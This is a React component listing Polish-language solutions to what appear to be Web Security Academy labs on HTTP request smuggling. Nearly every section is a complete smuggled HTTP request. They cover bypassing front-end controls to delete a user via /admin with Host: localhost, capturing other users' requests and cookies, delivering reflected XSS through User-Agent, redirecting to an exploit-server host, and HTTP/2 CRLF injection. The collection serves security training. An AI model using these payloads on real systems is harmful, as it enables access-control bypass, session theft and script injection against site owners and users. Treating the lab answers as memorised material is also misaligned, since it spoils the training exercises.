const HTTPRequestSmuggling = () =>{
    return(
        <details>
            <summary>HTTP request smuggling</summary>

            <details>
                <summary>Przemycanie żądań HTTP, potwierdzające lukę w zabezpieczeniach CL.TE poprzez różnicowe odpowiedzi</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p><span className="important">POST</span> / HTTP/1.1</p>
                    <p>Host: YOUR-LAB-ID.web-security-academy.net</p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 35</span></p>
                    <p><span className="important">Transfer-Encoding: chunked</span></p>
                    <br />
                    <p><span className="important">0</span></p>
                    <br />
                    <p><span className="important">GET /404 HTTP/1.1</span></p>
                    <p><span className="important">X-Ignore: X</span></p>
                </div>
            </details>

            <details>
                <summary>Przemycanie żądań HTTP, potwierdzające lukę w zabezpieczeniach TE.CL poprzez różnicową odpowiedź</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p><span className="important">POST</span> / HTTP/1.1</p>
                    <p>Host: YOUR-LAB-ID.web-security-academy.net</p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 4</span></p>
                    <p><span className="important">Transfer-Encoding: chunked</span></p>
                    <br />
                    <p><span className="important">5e</span></p>
                    <br />
                    <p><span className="important">GET /404 HTTP/1.1</span></p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 15</span></p>
                    <br/>
                    <p><span className="important">x=1</span></p>
                    <p><span className="important">0</span></p>
                </div>
            </details>

            <details>
                <summary>Wykorzystanie przemytu żądań HTTP w celu ominięcia kontroli bezpieczeństwa front-end, podatność CL.TE</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p><span className="important">POST</span> / HTTP/1.1</p>
                    <p>Host: YOUR-LAB-ID.web-security-academy.net</p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 139</span></p>
                    <p><span className="important">Transfer-Encoding: chunked</span></p>
                    <br />
                    <p><span className="important">0</span></p>
                    <br />
                    <p><span className="important">GET /admin/delete?username=carlos HTTP/1.1</span></p>
                    <p><span className="important"><u>Host: localhost</u></span></p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 10</span></p>
                    <br/>
                    <p><span className="important">x=</span></p>
                </div>
            </details>

            <details>
                <summary>Wykorzystanie przemytu żądań HTTP w celu ominięcia kontroli bezpieczeństwa front-end, podatność TE.CL</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p><span className="important">POST</span> / HTTP/1.1</p>
                    <p>Host: YOUR-LAB-ID.web-security-academy.net</p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 4</span></p>
                    <p><span className="important">Transfer-Encoding: chunked</span></p>
                    <br />
                    <p><span className="important">87</span></p>
                    <p><span className="important">GET /admin/delete?username=carlos HTTP/1.1</span></p>
                    <p><span className="important"><u>Host: localhost</u></span></p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 15</span></p>
                    <br/>
                    <p><span className="important">x=1</span></p>
                    <p><span className="important">0</span></p>
                </div>
            </details>

            <details>
                <summary>Wykorzystanie przemytu żądań HTTP w celu ujawnienia przepisywania żądań front-end</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p><span className="important">POST</span> / HTTP/1.1</p>
                    <p>Host: YOUR-LAB-ID.web-security-academy.net</p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 124</span></p>
                    <p><span className="important">Transfer-Encoding: chunked</span></p>
                    <br />
                    <p><span className="important">0</span></p>
                    <br />
                    <p><span className="important">POST / HTTP/1.1</span></p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 200</span></p>
                    <p><span className="important">Connection: close</span></p>
                    <br/>
                    <p><span className="important">search=test</span></p>

                    <br/>
                    <br/>
                    <br/>
                    <br/>
                    <p>W respons mamy specyficzny atrybut <span className="important"> <u>X-abcdef-Ip</u></span></p>
                    <br/>
                    <br/>
                    <br/>
                    <br/>

                    <p><span className="important">POST</span> / HTTP/1.1</p>
                    <p>Host: YOUR-LAB-ID.web-security-academy.net</p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 166</span></p>
                    <p><span className="important">Transfer-Encoding: chunked</span></p>
                    <br />
                    <p><span className="important">0</span></p>
                    <br />
                    <p><span className="important">GET /admin/delete?username=carlos HTTP/1.1</span></p>
                    <p><span className="important">X-abcdef-Ip: 127.0.0.1</span></p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 10</span></p>
                    <p><span className="important">Connection: close</span></p>
                    <br/>
                    <p><span className="important">x=1</span></p>
                </div>
            </details>

            <details>
                <summary>Wykorzystywanie przemytu żądań HTTP w celu przechwytywania żądań innych użytkowników</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p><span className="important">POST</span> / HTTP/1.1</p>
                    <p>Host: YOUR-LAB-ID.web-security-academy.net</p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 256</span></p>
                    <p><span className="important">Transfer-Encoding: chunked</span></p>
                    <br />
                    <p><span className="important">0</span></p>
                    <br />
                    <p><span className="important">POST /post/comment HTTP/1.1</span></p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 400</span></p>
                    <p><span className="important">Cookie: session=your-session-token</span></p>
                    <br/>
                    <p><span className="important">csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test</span></p>
                </div>
            </details>

            <details>
                <summary>Wykorzystanie przemytu żądań HTTP w celu dostarczenia odbitego XSS</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>Payload XSS: {`"/><script>alert(1)</script>`}</p>
                    <br />
                    <br />
                    <p><span className="important">POST</span> / HTTP/1.1</p>
                    <p>Host: YOUR-LAB-ID.web-security-academy.net</p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 150</span></p>
                    <p><span className="important">Transfer-Encoding: chunked</span></p>
                    <br />
                    <p><span className="important">0</span></p>
                    <br />
                    <p><span className="important">GET /post?postId=5 HTTP/1.1</span></p>
                    <p><span className="important">User-Agent: a{`"/><script>alert(1)</script>`}</span></p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 5</span></p>
                    <br/>
                    <p><span className="important">x=1</span></p>
                </div>
            </details>

            <details>
                <summary>H2.CL prośba o przemyt</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>Payload na Exploit server: {`alert(document.cookie`}</p>
                    <br />
                    <br />
                    <p><span className="important">POST</span> / HTTP/2</p>
                    <p>Host: YOUR-LAB-ID.web-security-academy.net</p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 0</span></p>
                    <br />
                    <p><span className="important">GET /resources HTTP/1.1</span></p>
                    <p><span className="important">Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net</span></p>
                    <p><span className="important">Content-Length: 5</span></p>
                    <br/>
                    <p><span className="important">x=1</span></p>
                </div>
            </details>

            <details>
                <summary>Przemycanie żądań HTTP/2 poprzez wstrzykiwanie CRLF</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>Tworzymy atrybut <span className="important">foo</span> o wartości:</p>
                    <p><span className="important">bar\r\n</span></p>
                    <p><span className="important">Transfer-Encoding: chunked</span></p>
                    <br />
                    <br />

                    <p>Request:</p>
                    <p><span className="important">0</span></p>
                    <br />
                    <p><span className="important">POST / HTTP/1.1</span></p>
                    <p><span className="important">Host: YOUR-LAB-ID.web-security-academy.net</span></p>
                    <p><span className="important">Cookie: session=YOUR-SESSION-COOKIE</span></p>
                    <p><span className="important">Content-Length: 800</span></p>
                    <br/>
                    <p><span className="important">search=x</span></p>
                </div>
            </details>

            <details>
                <summary>Podział żądań HTTP/2 poprzez wstrzykiwanie CRLF</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>Tworzymy atrybut <span className="important">foo</span> o wartości:</p>
                    <p><span className="important">bar\r\n</span></p>
                    <p><span className="important">\r\n</span></p>
                    <p><span className="important">GET /x HTTP/1.1\r\n</span></p>
                    <p><span className="important">Host: YOUR-LAB-ID.web-security-academy.net</span></p>
                </div>
            </details>

            <details>
                <summary>Przemyt żądań HTTP, podstawowa podatność CL.TE</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p><span className="important">POST</span> / HTTP/2</p>
                    <p>Host: YOUR-LAB-ID.web-security-academy.net</p>
                    <p><span className="important">Connection: keep-alive</span></p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 6</span></p>
                    <p><span className="important">Transfer-Encoding: chunked</span></p>
                    <br />
                    <p><span className="important">0</span></p>
                    <br />
                    <p><span className="important">G</span></p>
                </div>
            </details>

            <details>
                <summary>Przemyt żądań HTTP, podstawowa podatność TE.CL</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p><span className="important">POST</span> / HTTP/2</p>
                    <p>Host: YOUR-LAB-ID.web-security-academy.net</p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 4</span></p>
                    <p><span className="important">Transfer-Encoding: chunked</span></p>
                    <br />
                    <p><span className="important">5c</span></p>
                    <p><span className="important">GPOST / HTTP/1.1</span></p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 15</span></p>
                    <br />
                    <p><span className="important">x=1</span></p>
                    <p><span className="important">0</span></p>
                </div>
            </details>

            <details>
                <summary>Przemycanie żądań HTTP, zaciemnianie nagłówka TE</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p><span className="important">POST</span> / HTTP/2</p>
                    <p>Host: YOUR-LAB-ID.web-security-academy.net</p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 4</span></p>
                    <p><span className="important">Transfer-Encoding: chunked</span></p>
                    <p><span className="important">Transfer-Encoding: foo</span></p>
                    <br />
                    <p><span className="important">5c</span></p>
                    <p><span className="important">GPOST / HTTP/1.1</span></p>
                    <p><span className="important">Content-Type: application/x-www-form-urlencoded</span></p>
                    <p><span className="important">Content-Length: 15</span></p>
                    <br />
                    <p><span className="important">x=1</span></p>
                    <p><span className="important">0</span></p>
                </div>
            </details>
        </details>
    )
}

export default HTTPRequestSmuggling;
